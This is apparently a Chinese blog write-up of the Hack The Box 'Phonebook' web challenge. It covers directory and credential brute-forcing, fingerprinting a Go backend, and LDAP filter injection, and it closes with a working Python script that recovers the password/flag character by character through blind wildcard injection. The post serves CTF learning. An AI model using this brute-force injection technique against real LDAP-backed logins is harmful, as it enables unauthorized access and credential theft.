---
title: "HTB web challenge-Phonebook"
date: 2020-12-17T15:55:31+08:00
showDate: true
draft: false
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---

## 0x00 访问首页

进去就是一个访问页面

![1.png](1.png)

看看网页源码，还出了一个好像是登录之后的页面。

![2.png](2.png)

有个搜索的输入框，试了下，但是403了。暂时好像就这么多东西。

登录框试了下sql注入也没成。

## 0x01 爆破

开始尝试爆破，用gobuster爆破目录，然后用burpsuite爆破账号密码，运气还挺好，居然爆出来密码

![3.png](3.png)

## 0x02 寻找漏洞

现在搜索可以成功使用了

![4.png](4.png)

`search`接口的body是一个json
`{"term":"1"}: `

感觉漏洞应该就在这个搜索里了，搜索传参的时候传个无效json看看，服务端报错`{"error":"unexpected EOF"}`，

原来的搜索需要的body是`{"term":""}`，看看如果term的值不是字符串会怎样。服务端报错`{"error":"json: cannot unmarshal object into Go struct field Query.term of type string"}`

从这个报错可以知道服务端是golang实现的。

## 0x03 ldap注入

fuzz一下这个term的值发现，当参数里有`)`的时候服务端会报500，参数是`*`的时候search会返回所有的结果，这让我想起来之前做过的一个有关ldap的项目，ldap filter，如果这个接口是后端拼接请求去访问ldap，那就说得通了。再加上之前爆破出来的账号密码是`username: resse password: *`,那说明登录接口应该也是ldap查询的，查询的filter可能是`(&(username=u)(password=p))`


那Flag应该就藏在ldap的某一个地方了。说巧不巧，我就随手试了一下登录的payload
```
payload = {
    "username": "reese",
    "password": "HTB*"
}
```
结果登录成功了，HTB的flag都是HTB{flag}格式的，那说明reese的密码就是flag了。那我们可以通过bool盲注的方式把密码爆出来了。脚本如下

```python
import requests
import string

url = "http://159.65.56.112:30532/login"

flag = "HTB{"

payload = {
    "username": "reese",
    "password": flag
}

# 小飞机代理
proxies = {
    "http": "http://192.168.8.110:1080"
}

while payload.get("password")[-1] != "}":
    for i in string.printable:
        if i == "*":
            continue
        data = payload.copy()
        data["password"] += i + "*"
        

        r = requests.post(url, data=data, proxies=proxies)
        if r.url.find("login") == -1:
            print("got i", i)
            flag += i
            payload["password"] = flag
            print("now payload", payload)
            break

```

最后成功爆出flag
![5.png](5.png)


## 0x04 总结

ldap注入也是第一次遇到，这次算是运气比较好，直接拿到了flag。